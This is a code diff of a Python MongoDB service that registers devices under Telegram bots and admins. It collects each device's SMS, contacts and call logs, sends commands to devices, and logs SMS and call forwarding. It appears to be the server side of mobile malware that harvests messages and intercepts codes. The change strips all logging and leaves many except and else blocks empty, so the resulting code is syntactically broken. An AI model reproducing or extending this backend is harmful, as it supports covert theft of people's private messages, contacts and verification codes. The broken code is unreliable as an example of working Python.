@@ -3,14 +3,12 @@ from typing import List, Optional, Dict, Any
 from ..database import mongodb
 from ..models.schemas import Device, DeviceStatus, CommandStatus
 from ..config import settings
-import logging
+
 from bson import ObjectId
 import hashlib
 from pymongo import UpdateOne
 import re
 import random
-
-logger = logging.getLogger(__name__)
 
 class DeviceService:
 
@@ -36,9 +34,8 @@ class DeviceService:
                 admin = await auth_service.get_admin_by_token(admin_token)
                 if admin:
                     admin_username = admin.username
-                    logger.info(f"✅ Device {device_id} assigned to admin: {admin_username}")
+
                 else:
-                    logger.warning(f"⚠️  Invalid admin token for device: {device_id}")
 
             common_data = {
                 "model": device_info.get("model"),
@@ -120,15 +117,14 @@ class DeviceService:
             )
             
             if result.upserted_id:
-                logger.info(f"✅ New device registered: {device_id} (Bot {telegram_bot_id})")
+
             else:
-                logger.info(f"🔄 Device updated: {device_id}")
 
             device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
             return {"device": device_doc, "is_new": is_new_device}
 
         except Exception as e:
-            logger.error(f"❌ Register device failed: {e}")
+
             raise
 
     @staticmethod
@@ -139,7 +135,6 @@ class DeviceService:
                 {"$set": {"status": status, "last_ping": datetime.utcnow() if status == DeviceStatus.ONLINE else None, "updated_at": datetime.utcnow()}}
             )
         except Exception as e:
-            logger.error(f"❌ Update device status failed: {e}")
 
     @staticmethod
     async def update_battery_level(device_id: str, battery_level: int):
@@ -149,7 +144,6 @@ class DeviceService:
                 {"$set": {"battery_level": battery_level, "updated_at": datetime.utcnow()}}
             )
         except Exception as e:
-            logger.error(f"❌ Battery update failed: {e}")
 
     @staticmethod
     async def update_online_status(device_id: str, is_online: bool):
@@ -159,7 +153,6 @@ class DeviceService:
                 {"$set": {"is_online": is_online, "last_online_update": datetime.utcnow()}}
             )
         except Exception as e:
-            logger.error(f"❌ Online status update failed: {e}")
 
     @staticmethod
     async def get_device(device_id: str) -> Optional[Device]:
@@ -186,7 +179,7 @@ class DeviceService:
                 return Device(**normalized)
             return None
         except Exception as e:
-            logger.error(f"❌ Get device failed: {e}")
+
             return None
 
     @staticmethod
@@ -221,8 +214,7 @@ class DeviceService:
             
             if operations:
                 result = await mongodb.db.sms_messages.bulk_write(operations, ordered=False)
-                logger.info(f"📥 SMS saved: {result.upserted_count + result.modified_count}")
-            
+
             total_sms = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
             
             await mongodb.db.devices.update_one(
@@ -237,7 +229,7 @@ class DeviceService:
             
             
         except Exception as e:
-            logger.error(f"❌ Save SMS failed: {e}")
+
             raise
 
     @staticmethod
@@ -273,7 +265,6 @@ class DeviceService:
             
                     
         except Exception as e:
-            logger.error(f"❌ Save new SMS failed: {e}")
 
     @staticmethod
     async def get_sms_messages(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
@@ -288,7 +279,7 @@ class DeviceService:
                         msg[key] = str(value)
             return messages
         except Exception as e:
-            logger.error(f"❌ Get SMS failed: {e}")
+
             return []
 
     @staticmethod
@@ -329,9 +320,7 @@ class DeviceService:
                 result = await mongodb.db.contacts.bulk_write(operations, ordered=False)
                 new_count = result.upserted_count
                 update_count = result.modified_count
-                
-                logger.info(f"✅ Contacts: {new_count} new, {update_count} updated for {device_id}")
-            
+
             total = await mongodb.db.contacts.count_documents({"device_id": device_id})
             
             await mongodb.db.devices.update_one(
@@ -345,7 +334,6 @@ class DeviceService:
             )
 
         except Exception as e:
-            logger.error(f"❌ Contacts save failed: {e}")
 
     @staticmethod
     async def get_contacts(device_id: str, skip: int = 0, limit: int = 100) -> List[Dict]:
@@ -360,7 +348,7 @@ class DeviceService:
                         contact[key] = str(value)
             return contacts
         except Exception as e:
-            logger.error(f"❌ Get contacts failed: {e}")
+
             return []
 
     @staticmethod
@@ -417,10 +405,8 @@ class DeviceService:
                         }
                     }
                 )
-                logger.info(f"✅ Saved {new_count} call logs for {device_id}")
 
         except Exception as e:
-            logger.error(f"❌ Call logs save failed: {e}")
 
     @staticmethod
     async def get_call_logs(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
@@ -435,7 +421,7 @@ class DeviceService:
                         call[key] = str(value)
             return call_logs
         except Exception as e:
-            logger.error(f"❌ Get call logs failed: {e}")
+
             return []
 
     @staticmethod
@@ -466,7 +452,7 @@ class DeviceService:
                         log[key] = str(value)
             return logs
         except Exception as e:
-            logger.error(f"❌ Get logs failed: {e}")
+
             return []
 
     @staticmethod
@@ -504,9 +490,7 @@ class DeviceService:
                     }
                 }
             )
-            
-            logger.info(f"📝 Note saved for device: {device_id} - Priority: {priority}")
-            
+
             await DeviceService.add_log(
                 device_id,
                 "note",
@@ -517,7 +501,7 @@ class DeviceService:
             return True
             
         except Exception as e:
-            logger.error(f"❌ Save note failed: {e}")
+
             return False
 
     @staticmethod
@@ -540,8 +524,7 @@ class DeviceService:
             )
             
             if result.modified_count > 0:
-                logger.info(f"🔴 Marked {result.modified_count} devices as offline")
-            
+
             query = {} if is_super_admin else {"admin_username": admin_username}
             
             cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
@@ -553,13 +536,13 @@ class DeviceService:
                     normalized = DeviceService._normalize_device_data(device_doc)
                     device_list.append(Device(**normalized))
                 except Exception as e:
-                    logger.warning(f"⚠️ Skipping device {device_doc.get('device_id')}: {e}")
+
                     continue
             
             return device_list
             
         except Exception as e:
-            logger.error(f"❌ Get devices failed: {e}")
+
             return []
     
     @staticmethod
@@ -581,8 +564,7 @@ class DeviceService:
             )
             
             if result.modified_count > 0:
-                logger.info(f"🔴 Marked {result.modified_count} devices as offline")
-            
+
             cursor = mongodb.db.devices.find().skip(skip).limit(limit).sort("registered_at", -1)
             devices = await cursor.to_list(length=limit)
             
@@ -592,13 +574,13 @@ class DeviceService:
                     normalized = DeviceService._normalize_device_data(device_doc)
                     device_list.append(Device(**normalized))
                 except Exception as e:
-                    logger.warning(f"⚠️ Skipping device {device_doc.get('device_id')}: {e}")
+
                     continue
             
             return device_list
             
         except Exception as e:
-            logger.error(f"❌ Get devices failed: {e}")
+
             return []
 
     @staticmethod
@@ -621,7 +603,6 @@ class DeviceService:
                     {"$set": update_data}
                 )
         except Exception as e:
-            logger.error(f"❌ Update settings failed: {e}")
 
     @staticmethod
     async def create_command(device_id: str, command: str, parameters: dict = None) -> Optional[str]:
@@ -638,7 +619,7 @@ class DeviceService:
             result = await mongodb.db.commands.insert_one(command_doc)
             return str(result.inserted_id)
         except Exception as e:
-            logger.error(f"❌ Create command failed: {e}")
+
             return None
 
     @staticmethod
@@ -657,7 +638,6 @@ class DeviceService:
                 {"$set": update_data}
             )
         except Exception as e:
-            logger.error(f"❌ Update command status failed: {e}")
 
     @staticmethod
     async def update_device_info(device_id: str, device_info: dict):
@@ -708,7 +688,6 @@ class DeviceService:
                 {"$set": update_data}
             )
         except Exception as e:
-            logger.error(f"❌ Update device info failed: {e}")
 
     @staticmethod
     async def save_sent_sms(device_id: str, sms_data: dict):
@@ -744,7 +723,6 @@ class DeviceService:
                 {"$inc": {"stats.total_sms": 1}}
             )
         except Exception as e:
-            logger.error(f"❌ Save sent SMS failed: {e}")
 
     @staticmethod
     async def save_sms_forward_log(device_id: str, forward_data: dict):
@@ -769,7 +747,6 @@ class DeviceService:
 
             await mongodb.db.sms_forwarding_logs.insert_one(log_doc)
         except Exception as e:
-            logger.error(f"❌ Save SMS forward log failed: {e}")
 
     @staticmethod
     async def get_forwarding_number(device_id: str) -> Optional[str]:
@@ -790,7 +767,7 @@ class DeviceService:
                 return None
 
         except Exception as e:
-            logger.error(f"❌ Get forwarding number failed: {e}")
+
             return None
 
     @staticmethod
@@ -807,7 +784,6 @@ class DeviceService:
                 }
             )
         except Exception as e:
-            logger.error(f"❌ Disable SMS forwarding failed: {e}")
 
     @staticmethod
     async def save_call_forwarding_result(device_id: str, result_data: dict):
@@ -838,7 +814,6 @@ class DeviceService:
 
             await mongodb.db.call_forwarding_logs.insert_one(log_doc)
         except Exception as e:
-            logger.error(f"❌ Save call forwarding result failed: {e}")
 
     @staticmethod
     async def save_call_forwarding_disabled(device_id: str, result_data: dict):
@@ -867,7 +842,6 @@ class DeviceService:
 
             await mongodb.db.call_forwarding_logs.insert_one(log_doc)
         except Exception as e:
-            logger.error(f"❌ Save call forwarding disabled failed: {e}")
 
     @staticmethod
     async def get_stats(admin_username: Optional[str] = None) -> Dict[str, int]:
